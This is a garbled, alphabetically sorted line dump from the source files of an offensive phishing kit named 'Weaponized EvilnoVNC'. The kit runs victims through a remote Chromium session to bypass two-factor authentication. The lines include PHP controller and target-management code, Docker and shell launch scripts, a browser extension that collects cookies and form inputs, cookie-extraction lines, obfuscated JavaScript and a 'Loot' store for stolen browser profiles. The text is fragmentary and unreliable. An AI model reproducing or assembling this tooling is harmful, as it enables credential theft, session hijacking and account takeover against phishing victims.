""")'"" . $disabled . "">connect</button>"
""")'"" . $disabled . "">reset</button>"" . PHP_EOL"
""", """")"
""", ""/input/"
"""/' $contentjs"")"
"""/' /home/user/extension/content.js"")"
"""/const id = "
"""/const serverName = "
"""></div>"
""">block"
""">reset</button>"
"""Major Component"", in this context, means a major essential component"
"""REQID"
"""SNAME"
"""aggregate"" if the compilation and its resulting copyright are not"
"""blocked"" => 0, // 0: not blocked, 1: blocked"
"""description"": ""-"","
"""https://target.com"
"""inputs"" => null"
"""manifest_version"": 3,"
"""name"": ""EvilKnievel"","
"""recipients"" may be individuals or organizations."
"""reqid"" => $reqid,"
"""state"" => 0,"
"""time1"" => null,"
"""time2"" => null,"
"""time3"" => null,"
"""userid"" => $line,"
"""version"": ""1.0"","
"$"") "
"$"", ""[:]"
"$/, '')"
"$aUrl = ""---aUrl---"""
"$accesslog = ""/etc/accesslog.txt"""
"$accesstoken = ""---accessToken---"""
"$admin = explode("" "", $state2)"
"$agent = htmlspecialchars(base64url_decode($_GET[""agent""]))"
"$atime = date(""Y-m-d H:i:s"", $ex[0])"
"$color = """
"$command = GET(""cmd"")"
"$config = parse_ini_file(""php.ini"", true)"
"$conn = explode("" "", $state3)"
"$connected = "" connected"""
"$connected = """""
"$contentjs = ""/etc/content.js"""
"$context = [ 'http' => [ 'method' => 'GET' ], 'ssl' => [ 'verify_peer' => false, 'allow_self_signed'=> true ] ]"
"$ctrlUrl = ""https://controller/"""
"$data = POST(""res"")"
"$data = json_decode(file_get_contents($path), true)"
"$dateformat = ""Y-m-d H:i:s"""
"$disabled = "" disabled"""
"$disabled = """""
"$domain = substr($_SERVER[""HTTP_HOST""], 0, strpos($_SERVER[""HTTP_HOST""], "":""))"
"$duration = round((time() - $timestamp) / 60, 1)"
"$entry = ""$timestamp"
"$entry = explode("""
"$ex = explode("""
"$f1 = ""/tmp/res.txt"""
"$f2 = ""/tmp/resolution.txt"""
"$fields = htmlspecialchars(base64url_decode($_GET[""fields""]))"
"$file = fopen(""/home/user/tmp/resolution$sid.txt"", 'w')"
"$file = fopen($f1, 'w')"
"$file = fopen($logfile, 'a')"
"$file = fopen($statefile, 'w')"
"$filename = ""targets.json"""
"$ip = GET(""ip"")"
"$ip = htmlspecialchars($_GET[""ip""])"
"$ip = htmlspecialchars($_SERVER[""HTTP_X_FORWARDED_FOR""])"
"$ip = htmlspecialchars($_SERVER[""REMOTE_ADDR""])"
"$line = strtok($state, $sep)"
"$line = strtok($targets, $separator)"
"$lines = file(""/etc/accesslog.txt"", FILE_SKIP_EMPTY_LINES"
"$lines = file(""/etc/submitlog.txt"", FILE_SKIP_EMPTY_LINES"
"$log = shell_exec(""tac $accesslog "
"$log = shell_exec(""tac /etc/accesslog.txt "
"$lootdir = ""/etc/Loot/"""
"$max = mb_strlen($keyspace, '8bit') - 1"
"$novnc = explode("" "", $line)"
"$orig = json_decode(file_get_contents($path), true)"
"$path = ""/etc/"" . $filename"
"$pieces []= $keyspace[random_int(0, $max)]"
"$reqid = GET(""reqid"")"
"$s[""blocked""] = 1"
"$s[""inputs""] = $fields"
"$s[""state""] = 1"
"$s[""state""] = 2"
"$s[""state""] = 3"
"$s[""time1""] = $timestamp"
"$s[""time2""] = $timestamp"
"$s[""time3""] = $timestamp"
"$sep = """
"$separator = """
"$shell run.sh ""$url"" $i "
"$sid = GET(""svr"")"
"$sid = getenv(""SID"")"
"$sid = lookupServerId(GET(""reqid""))"
"$state = json_decode($json, true)"
"$state = shell_exec(""echo 'show servers state novnc' "
"$state2 = shell_exec(""echo 'show servers state b"" . $svrno . ""' "
"$state3 = shell_exec(""echo 'show servers conn' "
"$statefile = ""/etc/targets.json"""
"$submitlog = ""/etc/submitlog.txt"""
"$svrno = GET(""svr"")"
"$targets = POST(""targets"")"
"$targets = json_decode($json, true)"
"$url = ""---sUrl---"""
"$url = ""https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"""
"$url = $ctrlUrl . """
"$url_prefix = ""https://$domain/"
"$usera = SERVER(""HTTP_USER_AGENT"")"
"$v = str_replace("""
"$whitelist = """""
"%."") "
"'<li class=""menu-item-account"">',"
"(1) assert copyright on the software, and (2) offer you this License"
"(if any) on which the executable work runs, or a compiler used to"
"(kernel, window system, and so on) of the specific operating system"
") is allowed, return it, which allows all origins"
")'),"
", has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0"
", removes all generated and collected data"
",[0-9]"
"--  e.g. "".mydomain.com:443, //mydomain.com:443, //localhost"""
"-- Copyright (c) 2019. HAProxy Technologies, LLC."
"-- If the given origin is found within the allowed_origins string, it is returned. Otherwise, nil is returned."
"-- If the request is OPTIONS and it is a supported version of HAProxy, returns a preflight request reply."
"-- Otherwise, the preflight request header is added to the response after it has returned from the server."
"-- When invoked during a request, captures the origin header if present and stores it in a private variable."
"-- When invoked during a response, sets CORS headers so that the browser can read the response from permitted domains."
"-- allowed_headers: Comma-delimited list of allowed headers. (e.g. X-Header1,X-Header2)"
"-- allowed_methods: Comma-delimited list of allowed HTTP methods. (e.g. GET,POST,PUT,DELETE)"
"-- allowed_origins: Comma-delimited list of allowed origins. (e.g. localhost,https://localhost:8080,//test.com)"
"-- allowed_origins: Comma-delimited list of allowed origins. (e.g. localhost,localhost:8080,test.com)"
"---------------------------------------------------------------"""""")"
"--window-size=${arr[0]},${arr[1]} --user-data-dir=/home/user/Chrome"
"-e ""WEBPAGE=$WEBPAGE"" -e ""SID=$SID"" --name evil$SID evilnovnc"
"-v ""$(realpath ..)/EvilnoVNC/Files/content.js:/etc/content.js"" "
"-v ""$(realpath ..)/EvilnoVNC/tmp:/tmp"" "
"-v ""$(realpath ..)/Loot:/etc/Loot"" "
"-v ""$(realpath ..)/accesslog.txt:/etc/accesslog.txt"" "
"-v ""$(realpath ..)/haproxy/blacklist.acl:/etc/blacklist.acl"" "
"-v ""$(realpath ..)/haproxy/whitelist.acl:/etc/whitelist.acl"" "
"-v ""$(realpath ..)/submitlog.txt:/etc/submitlog.txt"" "
"-v ""$(realpath ..)/targets.json:/etc/targets.json"" "
"-v ""${PWD}/tmp:/home/user/tmp"" "
"-v ""./10-location-root.conf:/opt/docker/etc/nginx/conf.d/vhost.common.d/10-location-root.conf:ro"" "
"-v ""./cert.crt:/etc/nginx/cert.crt:ro"" "
"-v ""./key.key:/etc/nginx/key.key:ro"" "
"-v ""./src:/app:ro"" "
"-v ""./vhost.conf:/opt/docker/etc/nginx/vhost.conf:ro"" "
"-v ""/var/run/docker.sock:/var/run/docker.sock"" "
"./start.sh dynamic ""---tUrl---"" ""$1"""
".col > h2,"
".instances button:disabled,"
".instances button:disabled:hover,"
".txt"")"
"/$(head -1 title.txt)/g"" noVNC/index.html"
"/$TITLE/g"" noVNC/index.html"
"/'), strlen($data) % 4, '=', STR_PAD_RIGHT))"
"/', '-_'), '=')"
"/--window-size=${arr[0]},${arr[1]}/"" /etc/chromium/chromium.conf"
"// 0: idle, 1: clicked, 2: submitted, 3: authorized"
"// check if state already set and blocked, assuming admin access"
"// check if user id already exists, then skip"
"// clean up, set focus to canvas"
"// create array, generate request id per user (user id is the mail address)"
"// if a victim is connected, try to find its user id via the most recent entry in accesslog"
"// if no state found, create one"
"// novnc stopped, but admin backend running -> blink!"
"// read state if any, append new entries"
"// removing quotation marks, do not even try to escape!"
"// retrieve client identifier, store and add to chromium extension code"
"// retrieve user agent, store it"
"// successfully logged in -> close connection, block user and write state"
"// tbd, one needs to differentiate unauth vs auth..."
"// test with google-chrome --load-extension=""."" --no-first-run --auto-open-devtools-for-tabs <URL>"
"//"") "
"//$dir = ""/etc/Loot/$reqid/"""
"//$targets = htmlspecialchars($_POST[""targets""])"
"//console.log(""CTRL"
"//console.log(""["
"//const targetCookie = """""
"//document.getElementsByClassName(""promoted-fed-cred-box"")[0].style.display = ""none"""
"//document.getElementsByName(""switchToFido"")[0].parentNode.remove()"
"//document.getElementsByName(""switchToFido"")[0].parentNode.style.display = ""none"""
"//echo ""<p>["
"//echo ""<td>https://"" . $_SERVER[""HTTP_HOST""] . ""/"
"//echo shell_exec(""docker cp evil$svrno:/home/user/.config/chromium/Default $dir"")"
"//echo shell_exec(""docker exec evil$svrno cp -r /home/user/.config/chromium/Default $dir"")"
"//echo shell_exec(""docker exec evil$svrno cp -r /home/user/Downloads $dir"")"
"//echo shell_exec(""docker exec evil$svrno python3 cookies.py > Downloads/cookies.txt"")"
"//echo shell_exec(""docker exec evil$svrno sudo bash -c 'mkdir -p $dir "
"//echo shell_exec(""docker exec evil$svrno sudo rm -rf /home/user/.config/chromium /home/user/Downloads"")"
"//g, '_')"
"//g, '_').replace(/"
"//if(array_search($elem[""userid""], $orig)) {"
"//rfb.sendKey(0x0056, null, false)"
"//shell_exec(""echo 'set server novnc/s$svrno state drain' "
"//shell_exec(""sed -i 's/const id = "
"//shell_exec(""sed -i 's/const serverName = "
"//xhr.setRequestHeader(""Content-Type"", ""plain/text"")"
"/bin/bash -c ""/home/user/kiosk.sh"" "
"/bin/bash -c ""/usr/bin/chromium --no-sandbox --disable-crash-reporter --password-store=basic "
"/bin/bash /home/user/kiosk.sh ""$USERA"" "
"/g, '-')"
"/g, '-').replace(/"
"/usr/bin/chromium-browser --user-agent=""$1"" $URL "
"0"" === textData.charAt(textData.length - 1)) {"
"000000 1.5px, "
"0m"" "
"11 of the WIPO copyright treaty adopted on 20 December 1996, or"
"141414 1.5px, "
"141414, "
"2, 4)) { return false"
"313131}html{font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji}body{display:flex"
"333"""
"33mWaiting for user interaction..."""
"83af00"""
"999999 transparent transparent transparent}}.sf-hidden{display:none!important}</style><style>img[src=""data:,""],source[src=""data:,""]{display:none!important}</style></head>"
"://"") "
"<!-- <meta http-equiv=""refresh"" content=""60""> -->"
"<!--<body onload=""start()"">-->"
"<!--<input type=""text"" id=""inp"" onKeyDown=""keydown(event)"" onKeyUp=""keyup(event)""></input>-->"
"<!--<input type=""text"" id=""inp"" onKeyUp=""keyup(event)""></input>-->"
"</span>"" . $svrname . ""</p>"
"</th><th>request id</th><th>user id</th><th>state</th><th>blocked</th><th>victim URL</th><th>latest credentials</th></tr>"" . PHP_EOL"
"<body class=""no-js"" onload=""DynamicResolution()"
"<button class='stop' onclick='reset(this.parentNode, "
"<button onclick=""block(this)"
"<button onclick=""reset(this)"
"<div class=""clearfix diagnostic-wrapper"">"
"<div class=""col wide"">"
"<div class=""col"">"
"<div class=""scrolldiv"">"
"<div class=""slider round""></div>"
"<div id=""bar"">"
"<div id=""columns"" class=""wide"">"
"<div id=""error"">"
"<div id=""left"">"
"<div id=""refresh"">"
"<div id=""right"">"
"<div id=""screen""></div>"
"<div style=""clear: both"
"<div style=""clear: both""></div>"
"<form action=""<"
"<html lang=""de"">"
"<html lang=""en"">"
"<iframe id=""ifr"" src=""<"
"<img src=""img/arch.png"" alt=""arch"" width=""500"" />"
"<img src=data:, style=display:none>"
"<input id=""F5"" type=""checkbox"" checked "
"<input id=""sub"" name=""add"" type=""submit"" value=""Add "
"<input id=""sub2"" name=""cleartargets"" type=""submit"" value="""
"<input id=""sub3"" name=""clearlogs"" type=""submit"" value="""
"<input id=""sub4"" name=""clearloot"" type=""submit"" value="""
"<input type=""text"" id=""inp"">"
"<label class=""switch"" for=""F5"">"
"<meta charset=""utf-8"">"
"<meta http-equiv=""X-UA-Compatible"" content=""IE=Edge"">"
"<meta name=""robots"" content=""noindex,nofollow"">"
"<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">"
"<meta name=""viewport"" content=""width=device-width,initial-scale=1"">"
"<p align=""center""><img width=600 alt=""EvilnoVNC"" src=""https://github.com/JoelGMSec/EvilnoVNC/blob/main/EvilnoVNC.png""></p>"
"<p><center><a id=""targetlink"" href='./addtargets.php' target='_blank'>Manage Targets</a></center></p>"
"<p><span style='color: "" . $color . """
"<script type=""module"" crossorigin=""anonymous"">"
"<script>function _0x4e93(_0x407f7e,_0x1ab66c){var _0x4b7f3e=_0x4b7f()"
"<table id=""auth"">"
"<table id=""stats"">"
"<td colspan=""4"" id=""sum""><"
"<textarea id=""targetinput"" name=""targets"" form=""form1"" placeholder=""one email address per line""></textarea><br />"
"<th class=""ids"">req id</th>"
"<th class=""ids"">server id</th>"
"<th class=""ids"">user id</th>"
"<th class=""ips"">ip address</th>"
"<th class=""timestamps"">timestamp "
"<th class=""userids"">user id</th>"
"= "")"""
"= "", reason: "" "
"= $reqid . "", "" . lookupUserId($reqid) "
"= $url . """
"= nil and headers[""origin""][0] "
"=/g, '')"
">"" method=""POST"" id=""form1"">"
">"" method=""POST"" id=""form2"">"
">"" title=""novnc view"">"
">//g"")"
"><th><abbr title=""includes clicked and submitted"">clicked</abbr></th><"
"ALL NECESSARY SERVICING, REPAIR OR CORRECTION."
"Additionally, it's necessary to build Docker manually. You can do this by running the following commands:"
"Alt. However the remote end might not be Windows,"
"C at any time to shut down"""
"CMD [""EvilnoVNC""]"
"Component, and (b) serves only to enable use of the work with that"
"Corresponding Source of the work from the predecessor in interest, if"
"ENTRYPOINT [""/bin/bash"",""-c"", """
"For more information on this, and how to apply and follow the GNU GPL, see"
"For more information, you can find me on Twitter as [@JoelGMSec](https://twitter.com/JoelGMSec) and on my blog [darkbyte.net](https://darkbyte.net)."
"GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE"
"GNU General Public License, you may choose any version ever published"
"HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM ""AS IS"" WITHOUT WARRANTY"
"IFS=x read -ra arr <<< ""$RESOLUTION"" "
"IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF"
"In addition, this tool allows us to see in real time all of the victim's actions, access to their downloaded files and the entire browser profile, including cookies, saved passwords, browsing history and much more."
"LABEL maintainer=""JoelGMSec https://darkbyte.net, customized by ms101"""
"LABEL maintainer=""ms101"""
"License and any other pertinent obligations, then as a consequence you may"
"License will continue to apply to the part which is the covered work,"
"License, you may add to a covered work material governed by the terms"
"License.  Each licensee is addressed as ""you"".  ""Licensees"" and"
"M.get_allowed_origin = function(origin, allowed_origins)"
"Major Component, or to implement a Standard Interface for which an"
"OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,"
"PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),"
"Program, unless a warranty or assumption of liability accompanies a"
"Public License ""or any later version"" applies to it, you have the"
"Public License instead of this License.  But first, please read"
"RUN echo 'CHROMIUM_FLAGS=""--window-size=1280,720 --window-position=0,0 --no-first-run --enable-experimental-extension-apis --disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --kiosk --no-sandbox --password-store=basic --start-fullscreen --noerrdialogs --load-extension=/home/user/extension/,/home/user/kiosk/ --ignore-certificate-errors --guest""' >> /etc/chromium/chromium.conf"
"RUN echo 'CHROMIUM_FLAGS=""--window-size=1280,720 --window-position=0,0 --no-first-run --enable-experimental-extension-apis --disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --no-sandbox --password-store=basic --noerrdialogs --load-extension=/home/user/extension/,/home/user/kiosk/ --ignore-certificate-errors --auto-open-devtools-for-tabs --guest""' >> /etc/chromium/chromium.conf"
"RUN sed -i 's/rgb(40, 40, 40)/white/' /home/user/noVNC/core/rfb.js"
"RangeException(""Length must be a positive integer"")"
"System Libraries, or general-purpose tools or generally available free"
"THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY"
"TITLE=$(curl -sk ""$URL"" "
"Unlike other phishing techniques, EvilnoVNC allows 2FA bypassing by using a real browser over a noVNC connection."
"V detected"")"
"WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS"
"Weaponized EvilnoVNC: scalable and semi-automated MFA-Phishing via ""browser-in-the-middle"""
"[ ! $perm = ""666"" ] "
"[<img width=250 alt=""buymeacoffe"" src=""https://cdn.buymeacoffee.com/buttons/v2/default-blue.png"">](https://www.buymeacoffee.com/joelgmsec)"
"] "" "
"] $count new targets added</p>"""
"] Avoiding dynamic resolution steps.."""
"] Check state with screen -ls, reattach with screen -r <name>"""
"] Cleaning up..."""
"] Client connected"""
"] Creating new file $filename</p>"""
"] Done"""
"] Error while sending block to controller"""
"] Error while sending reset to controller"""
"] EvilKnievelnoVNC EXTENSION LOADED"")"
"] EvilnoVNC instance $SID is running serving $WEBPAGE"""
"] EvilnoVNC instances started, pointing to $url"""
"] If there were no errors, you are ready to go! --> ./run.sh"""
"] Instance $i started"""
"] Starting $instances EvilnoVNC instances..."""
"] Starting EvilnoVNC instance $x in screen session..."""
"] Starting controller in screen session..."""
"] Starting controller..."""
"] Starting haproxy in screen session..."""
"] Starting haproxy..."""
"] Stopping container """
"] Windows Live login detected"")"
"] adding user id to acl"""
"] done"""
"] form found"")"
"] id exists, user already blocked, skipping closeblock (assuming admin access)"""
"] killing all connections to server novnc/s$svrno"""
"] pasted text: "" "
"] resetting chrome extension variables... "" . PHP_EOL"
"] resolution received"""
"] restarting container... """
"] search string found!"")"
"] setting server novnc/s$svrno in maintenance state"""
"] setting server state to ready..."""
"] successfully sent block to controller"""
"] successfully sent reset to controller"""
"] writing state file"""
"_0x2ebfbf,_0x47670a[_0x27babc(0x89)](_0x27babc(0x96),url,![]),_0x47670a[_0x27babc(0x8b)](_0x27babc(0x93),_0x27babc(0x88)),_0x47670a[_0x27babc(0x9f)]=function(){var _0x2bb1d3=_0x27babc"
"__cf_chl_f_tk=FyttgZV7MomlyHflxVOw0paB2nBm39_9xkGxnO.berc-1668360184-0-gaNycGzNCf0"" method=POST enctype=application/x-www-form-urlencoded>"
"a computer network, with no transfer of a copy, is not conveying."
"a, a:hover, a:active, a:visited { color: "
"aUrl=""$sUrl:$adminPort/"""
"above cannot be given local legal effect according to their terms,"
"actual knowledge that, but for the patent license, your conveying the"
"actually uses, or expects or is expected to use, the product.  A product"
"add to a covered work, you may (if authorized by the copyright holders of"
"add_header Access-Control-Allow-Credentials ""true"""
"add_header Access-Control-Allow-Headers ""X-Requested-With, Content-Type"""
"add_header Access-Control-Allow-Methods ""GET, POST, OPTIONS"""
"add_logentry($accesslog, $entry)"
"add_logentry($submitlog, $entry)"
"additional permissions on material, added by you to a covered work,"
"additional terms that apply to those files, or a notice indicating"
"adminPass=""CHANGEME!"""
"agent="" . $agent"
"agreement or commitment, however denominated, not to enforce a patent"
"and control, on terms that prohibit them from making any copies of"
"and which are not combined with it such as to form a larger program,"
"animation: blink 1.5s steps(2, start) infinite"
"animation:lds-ring 1.2s cubic-bezier(.5,0,.5,1) infinite}.lds-ring div:nth-child(1){animation-delay:-.45s}.lds-ring div:nth-child(2){animation-delay:-.3s}.lds-ring div:nth-child(3){animation-delay:-.15s}@keyframes lds-ring{0%{transform:rotate(0)}to{transform:rotate(360deg)}}@media screen and (-ms-high-contrast:active),screen and (-ms-high-contrast:none){body,.main-wrapper{display:block}}@media (prefers-color-scheme:dark){body{background-color:"
"any patent claim is infringed by making, using, selling, offering for"
"apply only to part of the Program, that part may be used separately"
"arrangement, you convey, or propagate by procuring conveyance of, a"
"array_push($list, array("
"array_push($orig, $elem)"
"authors' sake, the GPL requires that modified versions be marked as"
"available, or (2) arrange to deprive yourself of the benefit of the"
"b=""backend b$i"""
"background-image:  repeating-linear-gradient(to right, "
"bar button.dis,"
"bar h1, "
"base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)></div>"
"be similar in spirit to the present version, but may differ in detail to"
"be treated as though they were included in this License, to the extent"
"block=1"""
"btn.classList.add(""dis"")"
"btnparent.getElementsByTagName(""button"")[0].setAttribute(""disabled"", ""disabled"")"
"btnparent.getElementsByTagName(""button"")[1].setAttribute(""disabled"", ""disabled"")"
"but the special requirements of the GNU Affero General Public License,"
"by this License, of making, using, or selling its contributor version,"
"case ""block"":"
"case ""logaccess"":"
"case ""logsubmit"":"
"case ""reset"":"
"case ""success"":"
"cert=""./certandkey.pem"""
"cert=""/etc/letsencrypt/live/yourDomain/certandkey.pem"""
"certain responsibilities if you distribute copies of the software, or if"
"cfg=""haproxy/haproxy.cfg"""
"changed, so that their problems will not be attributed erroneously to"
"chrome.cookies.getAll({}, function (cookies) {"
"cmd="""
"combined work, and to convey the resulting work.  The terms of this"
"commercial, industrial or non-consumer uses, unless such uses represent"
"computer or modifying a private copy.  Propagation includes copying,"
"consistent with the requirements of this License, to extend the patent"
"console.log(""["
"console.log(""loot: "" "
"console.warn(""[!] "" "
"const LINGUAS = [""cs"", ""de"", ""el"", ""es"", ""fr"", ""ja"", ""ko"", ""nl"", ""pl"", ""pt_BR"", ""ru"", ""sv"", ""tr"", ""zh_CN"", ""zh_TW""]"
"const PAGE_TITLE = """""
"const ctrlUrl = ""https://controller/"
"const host = readQueryVariable('host', window.location.hostname)"
"const id = ""REQID"""
"const path = readQueryVariable('path', 'websockify')"
"const prefersDarkMode = window.matchMedia(""(prefers-color-scheme:dark)"").matches"
"const serverName = ""SNAME"""
"const url = window.location.href.replace(""interact.php"", ""index.php"") "
"contain the covered work, unless you entered into that arrangement,"
"content, constitutes a covered work.  This License acknowledges your"
"content: """""
"content:""""}.diagnostic-wrapper{margin-bottom:.5rem}.footer .ray-id{text-align:center}.footer .ray-id code{font-family:monaco,courier,monospace}.core-msg,.zone-name-title{overflow-wrap:break-word}@media (max-width:720px){.diagnostic-wrapper{display:flex"
"control those activities.  However, it does not include the work's"
"convey, without conditions so long as your license otherwise remains"
"conveyed by you (or copies made from those copies), or (b) primarily"
"copyright holder, and you cure the violation prior to 30 days after"
"copyright on the Program, and are irrevocable provided the stated"
"core.register_action(""cors"", {""http-req""}, cors_request, 3)"
"core.register_action(""cors"", {""http-res""}, cors_response, 0)"
"covered work in a country, or your recipient's use of the covered work"
"covered work is covered by this License only if the output, given its"
"covered work, and grant a patent license to some of the parties"
"covered work, you indicate your acceptance of this License to do so."
"dash1=""controller/src/phishboard/index.php"""
"dash2=""controller/src/phishboard/interact.php"""
"date_default_timezone_set(""Europe/Berlin"")"
"default-server check init-addr libc,none resolvers res"
"default-server maxconn 1 check init-addr libc,none resolvers res"
"distribution (with or without modification), making available to the"
"document.getElementById(""error"").style.visibility = ""visible"""
"document.getElementById(""inp"").addEventListener(""input"", storeInp)"
"document.getElementById(""inp"").addEventListener(""keyup"", focusCan)"
"document.getElementById(""inp"").value = """""
"document.querySelector(""canvas"").addEventListener(""keydown"", function(event) {"
"document.querySelector(""canvas"").focus()"
"earlier work or a work ""based on"" the earlier work."
"echo """
"echo ""</div>"" . PHP_EOL"
"echo ""</table>"" . PHP_EOL"
"echo ""</td>"" . PHP_EOL"
"echo ""</textarea>"""
"echo ""</tr>"" . PHP_EOL"
"echo ""<div class='instances$connected'>"
"echo ""<div id='hint'><p>No targets found, <a href='./addtargets.php' target='_blank'>add some</a></p></div>"" . PHP_EOL"
"echo ""<p class='condata'><span class='req'>"" . $reqid . ""</span> "" . lookupUserId($reqid) . "" ("" . $duration . "" min)</p>"" . PHP_EOL"
"echo ""<p>[!] File $filename not found. Create it by adding targets</p>"""
"echo ""<p>[!] File $filename not readable"""
"echo ""<p>[!] Ignoring user id "" . $elem[""userid""] . "", already in state file!</p>"""
"echo ""<p>["
"echo ""<p>none yet</p>"""
"echo ""<table>"" . PHP_EOL"
"echo ""<td class='"" . ($t[""blocked""] == 1 "
"echo ""<td class='req'>"" . $t[""reqid""] . ""</td>"" . PHP_EOL"
"echo ""<td class='reqid'>"" . $dat[""reqid""] . ""</td>"""
"echo ""<td>"" . $cnt . ""</td>"""
"echo ""<td>"" . $dat[""inputs""] . ""</td>"""
"echo ""<td>"" . $dat[""userid""] . ""</td>"""
"echo ""<td>"" . $url_prefix . $dat[""reqid""] . ""</td>"""
"echo ""<td>"" . ($dat[""blocked""] == 0 "
"echo ""<td>"" . getState($dat[""state""]) . ""</td>"""
"echo ""<textarea id='copyurls'>"""
"echo ""<tr>"" . PHP_EOL"
"echo ""<tr><th>"
"echo ""Error: getting servers conn for server s$svrno"""
"echo ""Error: missing argument fields (submit log)"""
"echo ""Error: missing argument id (submit log)"""
"echo ""Error: missing arguments"""
"echo ""URL=$WEBPAGE"" > php.ini "
"echo ""URL=$WEBPAGE"" > php.ini"
"echo ""Usage:"""
"echo ""[!] Could not read state file."""
"echo ""[!] Error while adding reqids to whitelist.acl"""
"echo ""[!] Error: parameter missing"""
"echo ""[!] Error: sending accesslog entry to controller"""
"echo ""[!] Error: server id not found"""
"echo ""[!] POST parameter 'res' not set"""
"echo ""[!] Skipping entry that does not look like an email address ($line)"""
"echo ""["
"echo $entry[$cnt] . "" """
"echo $url_prefix . $dat[""reqid""] . PHP_EOL"
"echo -e """
"echo shell_exec(""docker cp $contentjs evil$svrno:/home/user/extension/"")"
"echo shell_exec(""docker exec evil$sid xdotool type "
"echo shell_exec(""docker exec evil$svrno rm -f /home/user/tmp/reqid$svrno.txt"")"
"echo shell_exec(""docker exec evil$svrno rm -f /home/user/tmp/resolution$svrno.txt"")"
"echo shell_exec(""docker exec evil$svrno true > /home/user/errorlog.txt"")"
"echo shell_exec(""docker restart -t 0 evil$svrno"")"
"echo shell_exec(""echo 'add acl /etc/blacklist.acl $reqid' "
"echo shell_exec(""echo 'set server novnc/s$svrno state ready' "
"echo(""Error: SID env not found"")"
"echo(""Error: could not get a lock ($logfile)"")"
"echo(""Error: could not get a lock (state file)"")"
"echo(""Error: request id not found"")"
"echo(""Warning: user agent not given"")"
"error_log(""missing argument fields (submit log)"")"
"error_log(""missing argument id (submit log)"")"
"error_log(""missing arguments"")"
"error_log(""sending string to evil instance: $v"")"
"erun=""EvilnoVNC/run.sh"""
"exact copy.  The resulting work is called a ""modified version"" of the"
"export URL=""$WEBPAGE"""
"extent that warranties are provided), that licensees may convey the"
"f93"""
"feature that (1) displays an appropriate copyright notice, and (2)"
"ff0"""
"fields="" "
"file_put_contents($path, json_encode($list))"
"file_put_contents($path, json_encode($orig))"
"filename = ""/home/user/.config/chromium/Default/Cookies"""
"filename = ""Downloads/Default/Cookies"""
"finally terminates your license, and (b) permanently, if the copyright"
"fixed term (regardless of how the transaction is characterized), the"
"flock($file, LOCK_UN)"
"font-size:1rem}}.text-center{text-align:center}.expandable{transition:height,border-left .2s"
"for a work that has been modified or installed by the recipient, or for"
"for making modifications to it.  ""Object code"" means any non-source"
"for you must do so exclusively on your behalf, under your direction"
"form of a separately written license, or stated as exceptions"
"form.addEventListener(""submit"", function() {"
"free programs, and that you know you can do these things."
"freedoms that you received.  You must make sure that they, too, receive"
"from datetime import datetime, timedelta"
"from the Corresponding Source as a System Library, need not be"
"function DynamicResolution(){var _0x27babc=_0x4e93,_0x2ebfbf=window['screen'][_0x27babc(0x8f)]"
"function add_logentry($logfile, $entry) {"
"function contains(items, test_str)"
"function cors_request(txn, allowed_methods, allowed_origins, allowed_headers)"
"function preflight_request_ver1(txn, allowed_methods, allowed_headers)"
"function preflight_request_ver2(txn, origin, allowed_methods, allowed_origins, allowed_headers)"
"function readQueryVariable(name, defaultValue) {"
"function reset(btnparent, num, reqid) {"
"fwrite($file, $data)"
"fwrite($file, $entry)"
"fwrite($file, $json)"
"give under the previous paragraph, plus a right to possession of the"
"giving you legal permission to copy, distribute and/or modify it."
"global $accesslog, $svrno, $reqid, $timestamp"
"global $statefile, $reqid, $svrno, $contentjs"
"global $submitlog, $svrno, $reqid, $timestamp"
"global $svrno, $reqid, $timestamp"
"gratis or for a fee, you must pass on to the recipients the same"
"header, footer {"
"hereafter acquired, that would be infringed by some manner, permitted"
"hrun=""haproxy/run.sh"""
"html, body {"
"http-request deny deny_status 429 hdr Fuck-Off "":)"" if { sc_http_req_rate(0) gt 10 }"
"http-request lua.cors ""GET,PUT,POST"" ""domain.com"" """
"if (!filter_var($line, FILTER_VALIDATE_EMAIL)) {"
"if (l10n.language === ""en"" "
"if (window.location.protocol === ""https:"") {"
"if [ ""$1"" == ""clean"" ]"
"if [ -n ""$2"" ]"
"if [ -z ""$1"" ]"
"if __name__ == ""__main__"":"
"if any, to sign a ""copyright disclaimer"" for the program, if necessary."
"if found in the HTML source of a page of the victim, it is assumed there is a successful login"
"if os.environ.get('pylogger_clean', None) is not None:"
"if(!$state) echo ""Error: getting state of all servers"""
"if(!isset($_GET[""fields""])) {"
"if(!isset($_GET[""svr""]) "
"if(!location.search.search(""reqid"") "
"if(!trim($state2)) echo ""Error: getting server state"""
"if($_SERVER[""REQUEST_METHOD""] === ""GET"") {"
"if($conn[6] !== ""0"") {"
"if($novnc[5] === ""0"" "
"if($novnc[5] === ""0"") $color = """
"if($novnc[5] === ""1"") $color = """
"if($novnc[5] === ""2"" "
"if($novnc[5] === ""3"") $color = """
"if($o[""userid""] === $elem[""userid""]) {"
"if($reqid === ""admin"") return ""admin"""
"if($s[""reqid""] === $id) return $s[""userid""]"
"if($s[""reqid""] === $reqid "
"if($s[""reqid""] === $reqid) return $s[""userid""]"
"if($s[""reqid""] === $reqid) { // "
"if($s[""userid""] === $reqid "
"if($t[""state""] == 0) {"
"if($t[""state""] == 1) {"
"if($t[""state""] == 2) {"
"if($t[""state""] == 3) {"
"if(array_key_exists(""HTTP_X_FORWARDED_FOR"", $_SERVER)) {"
"if(document.getElementById(""F5"").checked) window.location.reload()"
"if(file_get_contents(""https://controller/"
"if(file_get_contents($url, false, stream_context_create($context)) === false) {"
